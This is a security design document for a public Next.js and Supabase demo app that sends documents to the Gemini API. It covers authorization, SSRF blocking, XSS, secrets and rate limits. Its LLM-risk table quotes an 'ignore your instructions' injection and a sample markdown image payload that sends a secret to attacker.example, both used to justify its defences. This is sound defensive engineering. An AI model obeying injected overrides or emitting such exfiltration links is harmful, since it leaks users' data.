# Security

Security is priority one (see `README.md`). These rules are specific to this architecture: a **public URL**, **anonymous users**, **Supabase with RLS**, **Next.js server actions**, a **third-party LLM** receiving document content, and a **free quota** that is easy to exhaust.

---

## 1. Trust boundaries

```text
UNTRUSTED                                   TRUSTED
- the browser and everything it sends      - server code on Vercel
- uploaded files and pasted text           - Supabase (RLS enforces access)
- fetched web pages (URL sources)          - env vars / secrets
- model output (it may be steered by       
  injected text in a source)               
                                            THIRD PARTY
                                            - Gemini API: receives chunks and questions
```

Anything crossing from left to right is validated. Model output is treated as untrusted even though our server produced the request.

## 2. Authentication and abuse protection

- Every visitor gets an **anonymous Supabase session**. Sign-in is protected by **Cloudflare Turnstile** (Supabase Auth's built-in CAPTCHA support) in *managed/invisible* mode, so reviewers normally see no challenge.
- The CAPTCHA token is passed to `signInAnonymously({ options: { captchaToken } })`. The secret key lives only in the Supabase dashboard — never in the repo or the client.
- Anonymous users are the `authenticated` role in Postgres. RLS policies apply to them unchanged — do not write special cases based on `is_anonymous`.
- The demo password (`/demo-login`) buys an **entitlement**, not just a cookie: a `demo_entitlements` row for the session, which the demo policies and `notebooks_insert_owner` require. Both expire after 8 h. A phone-number-like throttle on the login route is *not* claimed — see §7.
- Middleware only refreshes sessions. **Authorization never happens in middleware alone.**

## 3. Authorization — defense in depth

Three layers, all required:

1. **RLS** on every table and storage bucket (`database.md`). This is the layer that must never fail.
2. **Explicit checks in every server action and route handler:** get the user from the server client, load the target row *through the user-scoped client*, and fail with 404 (not 403 — don't confirm existence) if it isn't theirs.
3. **Binding checks in Postgres for any reachable API.** `proxy.ts` only sees requests to the Next app; PostgREST is a different origin, so anything a client can do with the anon key directly (the demo reading, notebook creation) must be gated by a database-side check, not by the app that happens to be the usual caller. Two precedents: D-17's notebook-limit trigger and D-21's `is_demo_entitled()`.

**Server actions are public HTTP endpoints.** Anyone can call them with any arguments, not just our UI. Every action validates its input and checks ownership, even if "the button is only shown to the owner".

**Service-role key:**

- Lives only in `lib/supabase/admin.ts`, which imports `server-only`
- Allowed in: `scripts/` (seed, eval) and server code that has *already* verified ownership through the user-scoped client
- Never reachable from a code path where user input decides which rows it touches

The demo notebook is read-only for everyone: no action may write to rows where `is_demo = true`.

## 4. Input validation

- **Zod at every boundary**: action arguments, route params and bodies, env vars, LLM structured output, fetched URL metadata.
- **Bounds on everything:** string lengths (titles 200, pasted text 200k, questions 4k chars), array sizes (selected sources ≤ 10), file size (`MAX_UPLOAD_MB`), page count.
- **Check file content, not only the name:** PDFs must start with `%PDF-`; reject otherwise, whatever the extension or MIME type says.
- **IDs are UUIDs**, validated as such before reaching a query.

## 5. Files and storage

- Buckets are **private**. Access only through signed URLs with short expiry: upload 60s, read 1h.
- The **server generates storage paths**: `{userId}/{sourceId}.{ext}`. Never put a client-supplied filename into a path (path traversal); the original name is stored as `title` only.
- Deleting a notebook or source **also deletes its storage objects** explicitly. Postgres cascades don't remove Storage files — without this, "deleted" documents live on.

## 6. LLM-specific risks

Based on the OWASP Top 10 for LLM Applications, narrowed to what applies here.

| Risk | Rule |
|---|---|
| **Prompt injection** (a source says "ignore your instructions…") | Instructions and untrusted content are strictly separated: system rules first, then clearly delimited context blocks, then the question. The system prompt states that context is data. The model has **no tools** and triggers **no actions** — worst case is a wrong answer, never a wrong action. |
| **Data exfiltration via rendered output** | Model output is rendered as Markdown **without raw HTML and without images**. Links are allowed only for `http(s)`, open with `rel="noopener noreferrer nofollow"`. (An injected source could make the model emit `![](https://attacker.example/?q=<secret>)`; the browser would fetch it silently.) CSP `img-src` backs this up. |
| **Cross-user leakage** | Retrieval always filters by `notebook_id` *and* runs through RLS (`security invoker`). A prompt only ever contains chunks the current user may read. |
| **Unverified citations** | Citations are validated server-side against the chunks actually retrieved; invalid ones are dropped, never displayed. |
| **Sensitive info in prompts** | System prompts contain no secrets, keys, or internal URLs. Nothing in a prompt would be a problem if the model repeated it. |
| **Unbounded consumption** | `maxOutputTokens` on every call, context budgets, per-user rate limits, and the global daily cap (section 7). |

## 7. Rate limits and quota protection

Per-user limits alone are not enough: clearing cookies creates a new anonymous user. So there are three layers:

1. **Turnstile** on anonymous sign-in (makes mass account creation expensive)
2. **Per-user limits** via `lib/rate-limit.ts`: chat per minute, ingest per hour, audio per day
3. **Global daily AI cap** (`AI_GLOBAL_DAILY_CAP`): a circuit breaker counted across all users in `usage_events`. When reached, AI features return a friendly "daily demo limit reached" message until midnight UTC. This protects the free Gemini quota during the review window.

Every AI-calling route or action checks all applicable limits **before** calling the model.

Residual risk: per-user limits reset for anyone willing to clear cookies and pass Turnstile again, so (1)+(2) alone don't stop a determined single visitor from consuming a disproportionate share of the daily quota before (3) trips for everyone. Accepted for the demo since (3) still bounds total spend; a future guard worth considering is a coarser per-IP or per-fingerprint limit ahead of the global cap.

**The login limiter is a stopgap, deliberately.** `lib/demo-login-rate-limit.ts` is an in-process `Map`: on Vercel it counts per instance, and instances are created and recycled freely, so the real ceiling on password guessing is "attempts × warm instances", not five per window. Accepted rather than fixed: the password is a shared review secret handed out on request, guessing it buys nothing that asking for it does not (D-16), and the damage an entitled visitor can do is already bounded by (2) and (3) above plus the ingest and chat budgets. Making it durable would mean a table, a service-role write on an unauthenticated route, and its own cleanup — for a threat the entitlement is not protecting anything valuable against. Revisit only if the password ever gates something other than the public demo.

## 8. Server-side fetching (URL sources)

Fetching user-supplied URLs from our server is a classic SSRF vector.

- Only `http:` and `https:`; no credentials in URLs; ports 80/443 only
- Resolve DNS and **reject private, loopback, link-local and metadata addresses**: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `0.0.0.0/8`, `100.64.0.0/10`, `::1`, `fc00::/7`, `fe80::/10`
- Follow at most 3 redirects, **re-validating every hop**
- 10s timeout, 5 MB body cap, only `text/html` or `text/plain`
- Never forward the user's cookies or our secrets
- Residual risk (DNS rebinding between check and connect) is accepted for the demo and documented in the README's limitations

## 9. Output and XSS

- React escapes by default. **`dangerouslySetInnerHTML` is forbidden.**
- User-provided titles, filenames and extracted text are rendered as text, never as HTML.
- Security headers (set in T14): CSP (`default-src 'self'`; connect to Supabase and Turnstile; frames only for Turnstile; `img-src 'self' data: blob:`), `frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`.

## 10. Secrets

- Secrets only in `.env.local` (gitignored) and in Vercel environment variables.
- Client-exposed variables (`NEXT_PUBLIC_*`) are limited to the Supabase URL, the anon key and the Turnstile **site** key — all public by design.
- Don't pass whole DB rows to client components; select only the columns the UI needs. Props of client components are serialized into the page.
- **CI scans for secrets** (Gitleaks) on every push. A leaked key is rotated immediately — deleting the commit is not enough.

## 11. Dependencies

- Lockfile committed; CI installs with `--frozen-lockfile`
- **Dependabot** for npm and GitHub Actions; `pnpm audit --audit-level=high` in CI
- Keep Next.js on the latest patch release — framework-level vulnerabilities do happen
- New dependencies need a reason and approval (see `principles.md`, "Use the platform")

## 12. Errors, logging and privacy

- The client gets **readable, generic messages** from `lib/errors.ts`. No stack traces, SQL errors or provider responses.
- Server logs are structured JSON with `requestId`, `userId`, operation, timings and token counts. **Never log** document content, questions, answers, keys or tokens.
- The Gemini free tier may use submitted content to improve Google's products. The UI shows this notice **before the first upload**; the README repeats it.
- Collect nothing that isn't needed: no emails, no analytics, no tracking.
- Anonymous users inactive for `RETENTION_DAYS` (30) are deleted by a daily cron job (`/api/cron/retention`, `CRON_SECRET` bearer): storage objects first, then the auth user (rows cascade). The UI states this in a first-visit banner and the footer.

---

## Review checklist (every task that adds an entry point)

- [ ] Input validated with Zod, with bounds
- [ ] User resolved server-side; ownership checked (404 if not owned); demo rows not writable
- [ ] RLS covers every table and bucket touched
- [ ] Rate limits and global cap checked before any model call
- [ ] No service-role usage driven by user input
- [ ] Untrusted content delimited in prompts; model output rendered safely
- [ ] Storage objects deleted together with their rows
- [ ] No content, secrets or tokens in logs; errors mapped to user messages
